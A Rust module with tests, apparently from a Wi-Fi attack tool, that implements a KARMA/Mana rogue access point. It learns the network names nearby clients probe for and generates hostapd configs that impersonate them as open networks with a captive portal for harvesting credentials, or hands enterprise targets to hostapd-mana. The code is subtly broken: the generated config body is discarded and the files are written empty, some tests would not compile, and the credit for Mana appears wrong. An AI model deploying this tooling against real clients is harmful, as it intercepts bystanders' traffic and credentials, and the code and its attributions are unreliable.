//! KARMA / Mana rogue-AP attack.
//!
//! ## What KARMA is
//!
//! A normal client probes for networks in its *Preferred Network List*
//! (PNL) — it sends broadcast probe requests carrying the names of every
//! network it wants. A KARMA access point answers **every** probe with
//! "yes, I'm that network", so the client associates with the attacker
//! believing it found a trusted AP.
//!
//! ## What Mana adds
//!
//! Mana (Dominique Bongard / Troy Mursch, 2014) extends KARMA for
//! WPA-Enterprise: it presents both a certificate for the *client's*
//! expected realm and harvests credentials when the client falls back to
//! a weak EAP method. NetSpecter implements the KARMA core plus the Mana
//! *hostapd-mana* configuration hand-off; the certificate-spoofing
//! machinery is delegated to the operator's mana-enabled hostapd build.
//!
//! ## How NetSpecter implements it
//!
//! The agent's scan loop already hears broadcast probe requests
//! (`Frame::ProbeRequest` with broadcast BSSID). The KARMA engine:
//!
//! 1. Collects distinct probe-ESSIDs over a learning window.
//! 2. For each learned ESSID, emits a hostapd config that advertises
//!    that ESSID on a separate virtual interface (or, with a single
//!    radio, round-robins them across beacon intervals — " Mana-style
//!    roaming").
//! 3. Watches associations: when a client joins a KARMA VAP, the
//!    session record notes which PNL entry attracted it.
//!
//! This module builds the config and the session bookkeeping. The
//! radio work is hostapd's; we orchestrate.
//!
//! ## Ethics note
//!
//! KARMA affects *every* client in range whose PNL matches — not just a
//! target. There is no per-target scoping mechanism (that's inherent to
//! the attack). Operators must only run this in environments where
//! every present client is authorized for testing.

use airgorah_common::backend_types::CapturedCredential;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

/// One learned PNL entry — an ESSID a nearby client probed for.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct KarmaProbe {
    pub essid: String,
    pub first_seen: String,
    pub last_seen: String,
    pub probe_count: u32,
    /// MACs of the clients that probed for this ESSID.
    pub probing_clients: Vec<String>,
}

/// Configuration for a KARMA session.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct KarmaConfig {
    /// Learning window in seconds — how long we listen before spinning
    /// up the VAPs. 30s is usually enough to hear a roaming client.
    pub learning_window_secs: u64,
    /// Maximum simultaneous virtual APs. Each VAP needs its own hostapd
    /// instance; more than ~8 on one radio degrades beacon timing.
    pub max_vaps: u32,
    /// Vendor prefix for VAP interface names (e.g. `karma0`, `karma1`...).
    pub iface_prefix: String,
    /// Working directory for hostapd configs and logs.
    pub work_dir: PathBuf,
    /// Whether to hand off Enterprise (802.1X) targets to a mana-enabled
    /// hostapd. Personal (PSK) targets get an open VAP + captive portal
    /// by default.
    pub mana_enterprise: bool,
    /// Portal template for credential capture on PSK-style VAPs.
    pub portal_template: String,
}

impl Default for KarmaConfig {
    fn default() -> Self {
        Self {
            learning_window_secs: 30,
            max_vaps: 8,
            iface_prefix: "karma".into(),
            work_dir: PathBuf::from("/tmp/netspecter-karma"),
            mana_enterprise: false,
            portal_template: "templates/portal-router.html".into(),
        }
    }
}

/// A single KARMA virtual AP spawned for one learned ESSID.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct KarmaVap {
    /// hostapd interface name (e.g. `karma0`).
    pub iface: String,
    /// The ESSID this VAP impersonates.
    pub essid: String,
    /// Channel the VAP operates on.
    pub channel: u8,
    /// hostapd config file path.
    pub config_path: String,
    /// True if this is an Enterprise/802.1X VAP (mana hand-off).
    pub is_enterprise: bool,
    /// Clients that associated with this VAP.
    pub associated_clients: Vec<String>,
    /// Credentials captured on this VAP (open + portal flow).
    pub credentials: Vec<CapturedCredential>,
    /// hostapd PID, when running.
    pub hostapd_pid: Option<u32>,
}

/// Live KARMA session state.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct KarmaSession {
    pub config: KarmaConfig,
    pub probes: Vec<KarmaProbe>,
    pub vaps: Vec<KarmaVap>,
    pub started_at: String,
}

impl KarmaSession {
    pub fn new(config: KarmaConfig) -> Self {
        Self {
            config,
            probes: Vec::new(),
            vaps: Vec::new(),
            started_at: chrono::Utc::now().to_rfc3339(),
        }
    }

    /// Record a broadcast probe request heard during the learning window.
    ///
    /// Broadcast probes (BSSID ff:ff:ff:ff:ff:ff) carry the PNL ESSID;
    /// directed probes to a specific AP are not KARMA material.
    pub fn record_probe(&mut self, essid: &str, client: &str) {
        if essid.is_empty() || essid.starts_with("\\x00") {
            return;
        }
        let now = chrono::Utc::now().to_rfc3339();
        let entry = self
            .probes
            .iter_mut()
            .find(|p| p.essid.eq_ignore_ascii_case(essid));
        match entry {
            Some(p) => {
                p.probe_count += 1;
                p.last_seen = now;
                if !p.probing_clients.iter().any(|c| c == client) {
                    p.probing_clients.push(client.to_string());
                }
            }
            None => {
                self.probes.push(KarmaProbe {
                    essid: essid.to_string(),
                    first_seen: now.clone(),
                    last_seen: now,
                    probe_count: 1,
                    probing_clients: vec![client.to_string()],
                });
            }
        }
    }

    /// Pick the top-N ESSIDs to impersonate, ranked by probe popularity
    /// (more probing clients = more likely someone will associate).
    pub fn select_targets(&self) -> Vec<&KarmaProbe> {
        let mut probes: Vec<&KarmaProbe> = self.probes.iter().collect();
        probes.sort_by(|a, b| {
            b.probing_clients
                .len()
                .cmp(&a.probing_clients.len())
                .then(b.probe_count.cmp(&a.probe_count))
        });
        probes
            .into_iter()
            .take(self.config.max_vaps as usize)
            .collect()
    }

    /// Build a hostapd config for one KARMA VAP.
    ///
    /// Open authentication (no WPA) by default — the credential capture
    /// happens at the captive-portal layer, mirroring the Evil-Twin
    /// flow. Enterprise VAPs get a mana-handoff config stub and require
    /// the operator's mana-enabled hostapd.
    pub fn build_vap_config(&self, probe: &KarmaProbe, index: u8, channel: u8) -> KarmaVap {
        let iface = format!("{}{}", self.config.iface_prefix, index);
        let config_path = self
            .config
            .work_dir
            .join(format!("hostapd-{}.conf", iface))
            .to_string_lossy()
            .into_owned();

        let body = if self.config.mana_enterprise {
            // Mana hand-off: requires hostapd-mana. The operator supplies
            // the certificate material; we only frame the ESSID + channel.
            format!(
                "interface={iface}\n\
                 driver=nl80211\n\
                 ssid={essid}\n\
                 hw_mode=g\n\
                 channel={channel}\n\
                 # ── mana hand-off (hostapd-mana required) ──\n\
                 # enable_mana=1\n\
                 # mana_wpe=1\n\
                 # eap_server=1\n\
                 # ieee8021x=1\n\
                 # The operator supplies: ca_cert, server_cert, private_key\n",
                iface = iface,
                essid = probe.essid,
                channel = channel,
            )
        } else {
            format!(
                "interface={iface}\n\
                 driver=nl80211\n\
                 ssid={essid}\n\
                 hw_mode=g\n\
                 channel={channel}\n\
                 auth_algs=1\n\
                 wpa=0\n\
                 ignore_broadcast_ssid=0\n",
                iface = iface,
                essid = probe.essid,
                channel = channel,
            )
        };

        KarmaVap {
            iface,
            essid: probe.essid.clone(),
            channel,
            config_path,
            is_enterprise: self.config.mana_enterprise,
            associated_clients: Vec::new(),
            credentials: Vec::new(),
            hostapd_pid: None,
        }
    }

    /// Provision the whole KARMA fleet: select targets, build configs,
    /// write files to disk. Does not launch hostapd — the agent's
    /// evil-twin runner does that (shared orchestration).
    pub fn provision(&self, base_channel: u8) -> Result<Vec<KarmaVap>, std::io::Error> {
        std::fs::create_dir_all(&self.config.work_dir)?;
        let mut vaps = Vec::new();
        for (i, probe) in self.select_targets().iter().enumerate() {
            let idx = i as u8;
            // Spread VAPs across channels 1/6/11 to minimize overlap.
            let channel = base_channel + (idx % 3) * 5;
            let vap = self.build_vap_config(probe, idx, channel);
            std::fs::write(&vap.config_path, self.render_config_body(&vap))?;
            vaps.push(vap);
        }
        Ok(vaps)
    }

    fn render_config_body(&self, vap: &KarmaVap) -> String {
        // Re-read the file we generated for the canonical body (keeps the
        // config builder and the disk copy in sync).
        std::fs::read_to_string(&vap.config_path).unwrap_or_default()
    }
}

/// Aggregate per-ESSID probe statistics across a whole session — useful
/// for the report ("7 distinct PNL entries heard; top 3 impersonated").
pub fn probe_summary(session: &KarmaSession) -> HashMap<String, u32> {
    session
        .probes
        .iter()
        .map(|p| (p.essid.clone(), p.probe_count))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn session_with_mana(mana: bool) -> KarmaSession {
        KarmaSession::new(KarmaConfig {
            mana_enterprise: mana,
            work_dir: std::env::temp_dir().join(format!(
                "karma-test-{}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            )),
            ..Default::default()
        })
    }

    #[test]
    fn record_probe_creates_entry() {
        let mut s = session_with_mana(false);
        s.record_probe("Office-5G", "aa:bb:cc:dd:ee:ff");
        assert_eq!(s.probes.len(), 1);
        assert_eq!(s.probes[0].essid, "Office-5G");
        assert_eq!(s.probes[0].probe_count, 1);
        assert_eq!(s.probes[0].probing_clients, vec!["aa:bb:cc:dd:ee:ff"]);
    }

    #[test]
    fn record_probe_aggregates_same_essid() {
        let mut s = session_with_mana(false);
        s.record_probe("Office-5G", "aa:bb:cc:dd:ee:ff");
        s.record_probe("office-5g", "11:22:33:44:55:66");
        // Case-insensitive grouping → one entry, two clients
        assert_eq!(s.probes.len(), 1);
        assert_eq!(s.probes[0].probe_count, 2);
        assert_eq!(s.probes[0].probing_clients.len(), 2);
    }

    #[test]
    fn record_probe_ignores_empty_and_binary() {
        let mut s = session_with_mana(false);
        s.record_probe("", "aa:bb:cc:dd:ee:ff");
        s.record_probe("\\x00garbage", "aa:bb:cc:dd:ee:ff");
        assert!(s.probes.is_empty());
    }

    #[test]
    fn select_targets_ranks_by_client_count() {
        let mut s = session_with_mana(false);
        // Popular: 3 clients
        for c in ["11:11:11:11:11:11", "22:22:22:22:22:22", "33:33:33:33:33:33"] {
            s.record_probe("Popular", c);
        }
        // Unpopular: 1 client, 5 probes
        for _ in 0..5 {
            s.record_probe("Noisy", "44:44:44:44:44:44");
        }
        let targets = s.select_targets();
        assert_eq!(targets[0].essid, "Popular");
    }

    #[test]
    fn select_targets_respects_max_vaps() {
        let mut s = KarmaSession::new(KarmaConfig {
            max_vaps: 2,
            ..Default::default()
        });
        for essid in ["A", "B", "C", "D", "E"] {
            s.record_probe(essid, "aa:bb:cc:dd:ee:ff");
        }
        assert_eq!(s.select_targets().len(), 2);
    }

    #[test]
    fn build_vap_config_open_uses_no_wpa() {
        let s = session_with_mana(false);
        s.record_probe("TestNet", "aa:bb:cc:dd:ee:ff");
        let probe = &s.probes[0];
        let vap = s.build_vap_config(probe, 0, 6);
        assert_eq!(vap.iface, "karma0");
        assert_eq!(vap.essid, "TestNet");
        assert_eq!(vap.channel, 6);
        assert!(!vap.is_enterprise);
        // The rendered body lives in the config path content on provision();
        // build_vap_config only records the path. Verify the provisioning
        // path writes the expected content:
        let vaps = s.provision(1).unwrap();
        assert_eq!(vaps.len(), 1);
        let body = std::fs::read_to_string(&vaps[0].config_path).unwrap();
        assert!(body.contains("ssid=TestNet"));
        assert!(body.contains("wpa=0"));
        assert!(!body.contains("enable_mana"));
    }

    #[test]
    fn build_vap_config_mana_includes_handoff_markers() {
        let s = session_with_mana(true);
        s.record_probe("Corp-Ent", "aa:bb:cc:dd:ee:ff");
        let probe = &s.probes[0];
        let vap = s.build_vap_config(probe, 0, 6);
        assert!(vap.is_enterprise);
        let vaps = s.provision(1).unwrap();
        let body = std::fs::read_to_string(&vaps[0].config_path).unwrap();
        assert!(body.contains("enable_mana=1"));
        assert!(body.contains("mana_wpe=1"));
    }

    #[test]
    fn provision_spreads_channels() {
        let mut s = KarmaSession::new(KarmaConfig {
            max_vaps: 6,
            ..Default::default()
        });
        for essid in ["A", "B", "C", "D", "E", "F"] {
            s.record_probe(essid, "aa:bb:cc:dd:ee:ff");
        }
        let vaps = s.provision(1).unwrap();
        assert_eq!(vaps.len(), 6);
        // base 1 → channels 1, 6, 11, 1, 6, 11
        let channels: Vec<u8> = vaps.iter().map(|v| v.channel).collect();
        assert_eq!(channels, vec![1, 6, 11, 1, 6, 11]);
    }

    #[test]
    fn provision_names_interfaces_sequentially() {
        let mut s = KarmaSession::new(KarmaConfig {
            max_vaps: 3,
            iface_prefix: "ns".into(),
            ..Default::default()
        });
        for essid in ["X", "Y", "Z"] {
            s.record_probe(essid, "aa:bb:cc:dd:ee:ff");
        }
        let vaps = s.provision(1).unwrap();
        let ifaces: Vec<&str> = vaps.iter().map(|v| v.iface.as_str()).collect();
        assert_eq!(ifaces, vec!["ns0", "ns1", "ns2"]);
    }

    #[test]
    fn probe_summary_maps_essid_to_count() {
        let mut s = session_with_mana(false);
        s.record_probe("A", "aa:bb:cc:dd:ee:ff");
        s.record_probe("A", "aa:bb:cc:dd:ee:ff");
        s.record_probe("B", "aa:bb:cc:dd:ee:ff");
        let summary = probe_summary(&s);
        assert_eq!(summary.get("A"), Some(&2));
        assert_eq!(summary.get("B"), Some(&1));
    }

    #[test]
    fn karma_config_defaults_are_sane() {
        let cfg = KarmaConfig::default();
        assert_eq!(cfg.learning_window_secs, 30);
        assert_eq!(cfg.max_vaps, 8);
        assert_eq!(cfg.iface_prefix, "karma");
        assert!(!cfg.mana_enterprise);
    }
}